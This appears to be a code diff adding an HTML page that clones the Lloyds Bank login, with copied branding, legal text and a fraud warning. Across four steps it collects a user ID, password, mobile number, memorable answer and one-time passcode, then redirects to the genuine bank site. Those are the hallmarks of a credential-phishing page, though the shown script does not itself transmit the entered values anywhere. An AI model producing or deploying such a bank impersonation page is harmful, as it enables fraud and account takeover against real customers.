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" alt="Lloyds Black Horse" />
+    </div>
+    <span class="logo-brand">LLOYDS</span>
+  </a>
+  <div class="header-right">&#128274;&nbsp;Secure Internet Banking</div>
+</header>
+
+<main>
+  <div class="wrap">
+
+    <!-- Login card -->
+    <div class="card">
+      <div class="card-head">
+        <h1>Log in to Internet Banking</h1>
+        <div class="tabs">
+          <div class="tab active" id="tab1"><span class="step-num">1</span> Your details</div>
+          <div class="tab" id="tab2"><span class="step-num">2</span> Memorable info</div>
+          <div class="tab" id="tab3"><span class="step-num">3</span> One-time code</div>
+          <div class="tab" id="tab4"><span class="step-num">4</span> Access granted</div>
+        </div>
+      </div>
+      <div class="card-body">
+
+        <!-- STEP 1 -->
+        <div class="step active" id="step1">
+          <div class="fg">
+            <label for="uid">User ID</label>
+            <input type="text" id="uid" autocomplete="username" maxlength="10" />
+            <p class="hint">Your 8&ndash;10 digit User ID. You chose this when you registered.</p>
+          </div>
+          <div class="fg">
+            <label for="pwd">Password</label>
+            <input type="password" id="pwd" autocomplete="current-password" />
+            <p class="hint">Your password is case sensitive.</p>
+          </div>
+          <div class="fg">
+            <label for="mobile">Registered mobile number</label>
+            <input type="tel" id="mobile" autocomplete="off" placeholder="e.g. 07700 900000" />
+            <p class="hint">We&rsquo;ll send a one-time passcode to this number in step 3.</p>
+          </div>
+          <label class="chk"><input type="checkbox" /> Remember my User ID on this device</label>
+          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#">Forgotten your User ID?</a>
+            <a href="#">Forgotten your password?</a>
+            <a href="#">Not yet registered for Internet Banking?</a>
+          </div>
+        </div>
+
+        <!-- STEP 2 -->
+        <div class="step" id="step2">
+          <div class="info-bar">For extra security please answer your memorable question. This is in addition to your password.</div>
+          <div class="fg">
+            <label for="mq">Memorable question</label>
+            <select id="mq">
+              <option value="">-- Please select --</option>
+              <option>What is the name of your first pet?</option>
+              <option>What is your mother&rsquo;s maiden name?</option>
+              <option>What was the name of your first school?</option>
+              <option>What is the name of the town where you were born?</option>
+              <option>What is your oldest sibling&rsquo;s middle name?</option>
+              <option>What was your childhood nickname?</option>
+              <option>What street did you grow up on?</option>
+            </select>
+          </div>
+          <div class="fg">
+            <label for="ma">Memorable answer</label>
+            <input type="password" id="ma" autocomplete="off" />
+            <p class="hint">Your answer is not case sensitive.</p>
+          </div>
+          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#" onclick="go(1);return false;">&larr; Back to log in</a>
+            <a href="#">I can&rsquo;t remember my answer</a>
+          </div>
+        </div>
+
+        <!-- STEP 3 -->
+        <div class="step" id="step3">
+          <div class="otp-box">
+            <strong>We&rsquo;ve sent you a one-time passcode</strong>
+            A 6-digit code has been sent to your mobile number ending <strong id="otp-hint"></strong>. It will expire in 10 minutes.
+          </div>
+          <div class="fg">
+            <label>Enter your 6-digit code</label>
+            <div class="digits">
+              <input type="text" maxlength="1" class="otp-digit" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" inputmode="numeric" />
+              <input type="text" maxlength="1" class="otp-digit" inputmode="numeric" />
+            </div>
+          </div>
+          <p class="resend-txt">Didn&rsquo;t receive a code? <a href="#" onclick="return false;">Resend code</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Use a different method</a></p>
+          <button class="btn" onclick="goWithLoader(4,this)">Verify and continue</button>
+          <hr />
+          <div class="links">
+            <a href="#" onclick="go(2);return false;">&larr; Back</a>
+          </div>
+        </div>
+
+        <!-- STEP 4 -->
+        <div class="step" id="step4">
+          <div class="granted">
+            <div class="tick-circle">
+              <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
+                <path d="M8 18l7.5 7.5 13-13" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <h2>Access Granted</h2>
+            <p>You have successfully logged in to Lloyds Internet Banking.</p>
+            <p>You are being redirected to your account&hellip;</p>
+            <div class="redir-bar">
+              <strong id="ctxt">Redirecting in 5 seconds</strong>
+              You will be taken to the Lloyds Bank main website.
+              <div class="prog-track"><div class="prog-fill" id="pfill"></div></div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Sidebar -->
+    <div class="side">
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'" style="transition:transform .2s,box-shadow .2s;">
+        <div style="height:4px;background:#006A3E;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M3 6h10M10 3l3 3-3 3M15 12H5M8 15l-3-3 3-3" stroke="#006A3E" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#006A3E;background:#E8F5ED;padding:3px 10px;border-radius:20px;">Current Account</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#006A3E;line-height:1;margin-bottom:6px;">£175</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">Switch & get £175 cash</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Switch your current account to Lloyds Bank using the Current Account Switch Service. Paid within 3 working days. New customers only, T&amp;Cs apply.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#006A3E;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Switch now <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#006A3E" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'" style="transition:transform .2s,box-shadow .2s;">
+        <div style="height:4px;background:#006A3E;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M9 2l1.9 4.1L15.5 7l-3.2 3.2.8 4.8L9 12.7l-4.1 2.3.8-4.8L2.5 7l4.6-.9L9 2z" stroke="#006A3E" stroke-width="1.5" stroke-linejoin="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#006A3E;background:#E8F5ED;padding:3px 10px;border-radius:20px;">Club Lloyds</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#006A3E;line-height:1;margin-bottom:6px;">Up to £26/mo</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">A lifestyle benefit every month</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Choose from cinema tickets, a Gourmet Society dining card, a coffee subscription, a digital magazine or National Trust Family Pass.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#006A3E;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Explore Club Lloyds <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#006A3E" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+<div class="fraud-alert">
+        <strong>&#9888; Fraud warning</strong>
+        Lloyds Bank will never call to ask for your full password, PIN, or ask you to move money to a &ldquo;safe account&rdquo;.
+      </div>
+      <div class="sbox">
+        <div class="sbox-h">Use our mobile app</div>
+        <div class="sbox-b">
+          <p>Log in quickly and securely using the Lloyds Bank Mobile Banking app with Face ID or Touch ID.</p>
+          <p><a href="#">Download for iOS</a> &nbsp;|&nbsp; <a href="#">Android</a></p>
+        </div>
+      </div>
+      <div class="sbox">
+        <div class="sbox-h">Need help?</div>
+        <div class="sbox-b">
+          <p>Having trouble? Visit our <a href="#">help centre</a> for guidance.</p>
+          <p><strong>0345 300 0000</strong><br/><span style="font-size:11px;color:#888">Mon&ndash;Fri 8am&ndash;8pm &middot; Sat 9am&ndash;4pm</span></p>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</main>
+
+<footer>
+  <div class="flinks">
+    <a href="#">Privacy policy</a>
+    <a href="#">Cookie policy</a>
+    <a href="#">Accessibility</a>
+    <a href="#">Security centre</a>
+    <a href="#">Terms &amp; conditions</a>
+    <a href="#">Contact us</a>
+  </div>
+  <p class="fcopy">Lloyds Bank plc. Registered in England and Wales No. 2065. Registered office: 25 Gresham Street, London EC2V 7HN.<br>Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and Prudential Regulation Authority under registration number 119278.</p>
+</footer>
+
+<script>
+  function goWithLoader(n, btn) {
+    var origHtml = btn.innerHTML;
+    var isFinal  = n === 4;
+    btn.disabled = true;
+    btn.style.opacity = '.72';
+    btn.innerHTML = '<span style="display:inline-block;width:14px;height:14px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:ld-spin .65s linear infinite;vertical-align:middle;margin-right:8px;"></span>'
+                  + (isFinal ? 'Verifying…' : 'Please wait…');
+    var ov  = document.getElementById('ld-ov');
+    var msg = document.getElementById('ld-msg');
+    msg.textContent = isFinal ? 'Verifying your details…' : 'Please wait…';
+    ov.style.display = 'flex';
+    /* double rAF forces repaint so transition fires */
+    requestAnimationFrame(function(){ requestAnimationFrame(function(){ ov.style.opacity = '1'; }); });
+    setTimeout(function() {
+      go(n);
+      setTimeout(function() {
+        ov.style.opacity = '0';
+        setTimeout(function() { ov.style.display = 'none'; }, 260);
+        /* restore button only on non-final steps */
+        if (!isFinal) {
+          btn.innerHTML = origHtml;
+          btn.disabled  = false;
+          btn.style.opacity = '1';
+        }
+      }, isFinal ? 400 : 200);
+    }, isFinal ? 1500 : 680);
+  }
+
+
+  function go(n) {
+    if (n === 3) {
+      var raw  = document.getElementById('mobile').value.replace(/s/g, '');
+      var last = raw.length >= 2 ? raw.slice(-2) : (raw || '??');
+      document.getElementById('otp-hint').textContent = '●●●●' + last;
+    }
+    document.querySelectorAll('.step').forEach(function(s){ s.classList.remove('active'); });
+    document.querySelectorAll('.tab').forEach(function(t, i){
+      t.classList.remove('active','done');
+      if (i + 1 < n)  t.classList.add('done');
+      if (i + 1 === n) t.classList.add('active');
+    });
+    document.getElementById('step' + n).classList.add('active');
+    if (n === 4) startRedirect();
+  }
+
+  function startRedirect() {
+    var s    = 5;
+    var fill = document.getElementById('pfill');
+    var txt  = document.getElementById('ctxt');
+    fill.style.transition = 'width ' + s + 's linear';
+    setTimeout(function(){ fill.style.width = '100%'; }, 50);
+    var iv = setInterval(function(){
+      s--;
+      if (s <= 0) { clearInterval(iv); txt.textContent = 'Redirecting now…'; setTimeout(function(){ window.location.href = 'https://www.lloydsbank.com'; }, 400); }
+      else txt.textContent = 'Redirecting in ' + s + ' second' + (s === 1 ? '' : 's');
+    }, 1000);
+  }
+
+  var digits = document.querySelectorAll('.otp-digit');
+  digits.forEach(function(inp, i){
+    inp.addEventListener('input', function(){
+      this.value = this.value.replace(/[^0-9]/g,'');
+      if (this.value && i < digits.length - 1) digits[i+1].focus();
+    });
+    inp.addEventListener('keydown', function(e){
+      if (e.key === 'Backspace' && !this.value && i > 0) digits[i-1].focus();
+    });
+  });
+</script>
+
+  <!-- Loading Overlay -->
+  <div id="ld-ov" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,.96);z-index:9000;display:none;flex-direction:column;align-items:center;justify-content:center;gap:20px;opacity:0;transition:opacity .25s;">
+    <div style="position:relative;width:56px;height:56px;">
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid #e8e8e8;"></div>
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid transparent;border-top-color:#006A3E;animation:ld-spin .8s linear infinite;"></div>
+    </div>
+    <div id="ld-msg" style="font-size:14px;color:#555;font-weight:600;letter-spacing:.2px;"></div>
+  </div>
+
+  <!-- Cookie Banner -->
+  <div id="ck-bar" style="position:fixed;bottom:0;left:0;right:0;z-index:9999;">
+    <style>
+      @keyframes ckUp{from{transform:translateY(110%);opacity:0}to{transform:translateY(0);opacity:1}}
+      @keyframes ckDown{from{transform:translateY(0);opacity:1}to{transform:translateY(110%);opacity:0}}
+      #ck-bar{animation:ckUp .5s cubic-bezier(.22,1,.36,1) forwards;}
+    </style>
+    <div style="height:4px;background:#006A3E;"></div>
+    <div style="background:#111;padding:18px 28px;display:flex;align-items:center;gap:20px;flex-wrap:wrap;box-shadow:0 -6px 28px rgba(0,0,0,.5);">
+      <div style="width:48px;height:48px;background:#006A3E;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;box-shadow:0 2px 10px rgba(0,0,0,.3);">&#127850;</div>
+      <div style="flex:1;min-width:200px;">
+        <div style="font-size:14px;font-weight:800;color:#fff;margin-bottom:5px;letter-spacing:.1px;">Lloyds Bank uses cookies</div>
+        <p style="font-size:12px;color:#aaa;margin:0;line-height:1.6;">We use cookies and similar technologies to enhance your experience, remember your preferences and help us understand how our site is used. <a href="#" style="color:#7fcca9;text-decoration:underline;font-weight:600;">Read our cookie policy</a></p>
+      </div>
+      <div style="display:flex;gap:10px;flex-shrink:0;">
+        <button onclick="manageCk()" onmouseover="this.style.borderColor='#aaa';this.style.color='#fff'" onmouseout="this.style.borderColor='#555';this.style.color='#ccc'" style="padding:10px 18px;background:transparent;color:#ccc;border:1.5px solid #555;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600;transition:all .15s;white-space:nowrap;">Manage preferences</button>
+        <button onclick="acceptCk()" onmouseover="this.style.opacity='.88'" onmouseout="this.style.opacity='1'" style="padding:10px 24px;background:#006A3E;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:13px;font-weight:800;transition:opacity .15s;white-space:nowrap;box-shadow:0 2px 8px rgba(0,0,0,.25);">Accept all cookies</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    (function(){if(localStorage.getItem('ck-ok'))document.getElementById('ck-bar').style.display='none';})();
+    function acceptCk(){localStorage.setItem('ck-ok','1');var b=document.getElementById('ck-bar');b.style.animation='ckDown .35s ease forwards';setTimeout(function(){b.style.display='none';},320);}
+    function manageCk(){acceptCk();}
+  </script>
+</body>
+</html>
